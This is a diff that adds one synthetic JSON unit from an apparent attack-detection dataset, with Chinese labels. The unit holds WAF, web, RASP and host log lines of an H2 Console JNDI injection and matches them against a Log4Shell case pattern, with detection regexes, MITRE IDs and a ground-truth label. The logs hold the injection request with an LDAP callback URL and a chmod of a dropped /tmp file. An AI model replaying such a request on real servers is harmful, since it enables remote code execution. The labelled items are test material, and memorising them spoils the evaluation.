@@ -1,0 +1,191 @@
+{
+ "unit": 1018,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-001",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "JNDI 家族（H2 驱动加载），注入载体不同"
+ },
+ "technique": "H2 Console JNDI 驱动加载（/h2-console/login.do 远程类）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-16 05:42:09",
+   "source": "waf",
+   "log_id": "WAF0305483",
+   "content": "/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi",
+   "event_id": "1018-WAF0305483"
+  },
+  {
+   "timestamp": "2026-06-16 05:42:10",
+   "source": "web",
+   "log_id": "WEB0307470",
+   "content": "/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi",
+   "event_id": "1018-WEB0307470"
+  },
+  {
+   "timestamp": "2026-06-16 05:42:12",
+   "source": "rasp",
+   "log_id": "RASP0337981",
+   "content": "https://app-spring-2.ops-corp.com/h2-console/login.do {\"jndi\": \"ldap://10.20.5.19\"} Mozilla/5.0 (Windows NT 11",
+   "event_id": "1018-RASP0337981"
+  },
+  {
+   "timestamp": "2026-06-16 05:43:07",
+   "source": "hids",
+   "log_id": "HID0331055",
+   "content": "chmod +x /tmp/.h2 <== /bin/sh -c 'chmod +x /tmp/.h2' <== /usr/bin/java -jar /opt/app/admin.jar",
+   "event_id": "1018-HID0331055"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 2,
+   "detected_steps": 2,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 2,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S2",
+     "action_id": "log4shell_app_jndi_lookup",
+     "label": "应用侧 JNDI 解析并回连",
+     "generic": true,
+     "event_ids": [
+      "1018-RASP0337981"
+     ],
+     "sources": [
+      "rasp"
+     ],
+     "aligned_event_id": "1018-RASP0337981",
+     "detections": [
+      {
+       "event_id": "1018-RASP0337981",
+       "source": "rasp",
+       "timestamp": "2026-06-16 05:42:12"
+      }
+     ]
+    },
+    {
+     "step_id": "S3",
+     "action_id": "log4shell_java_child_cmd",
+     "label": "java 进程派生子 shell 执行命令",
+     "generic": true,
+     "event_ids": [
+      "1018-HID0331055"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "aligned_event_id": "1018-HID0331055",
+     "detections": [
+      {
+       "event_id": "1018-HID0331055",
+       "source": "hids",
+       "timestamp": "2026-06-16 05:43:07"
+      }
+     ]
+    }
+   ],
+   "source_mismatches": [],
+   "unaligned_detections": [],
+   "keyword_score": 8,
+   "keyword_details": [
+    "probe +4: \\\"jndi\\\"\\s*:\\s*\\\"ldap://",
+    "probe +4: java(?:\\.exe)?\\s+-jar\\s+/opt/app/"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1"
+   ],
+   "before_steps": [
+    "S1"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0,
+   "pattern_scope": {
+    "attack_family": "Log4j2 JNDI 注入（CVE-2021-44228）",
+    "variant_note": "由单个合成样本归纳；RMI/DNS 协议变体与二次载荷形式尚未多实例验证。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "横向移动",
+     "凭据窃取",
+     "反序列化回显"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 2,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S2",
+    "label": "应用侧 JNDI 解析并回连",
+    "sources": [
+     "rasp"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1018-RASP0337981"
+    ]
+   },
+   {
+    "step_id": "S3",
+    "label": "java 进程派生子 shell 执行命令",
+    "sources": [
+     "hids"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1018-HID0331055"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 8,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1105"
+  ]
+ }
+}
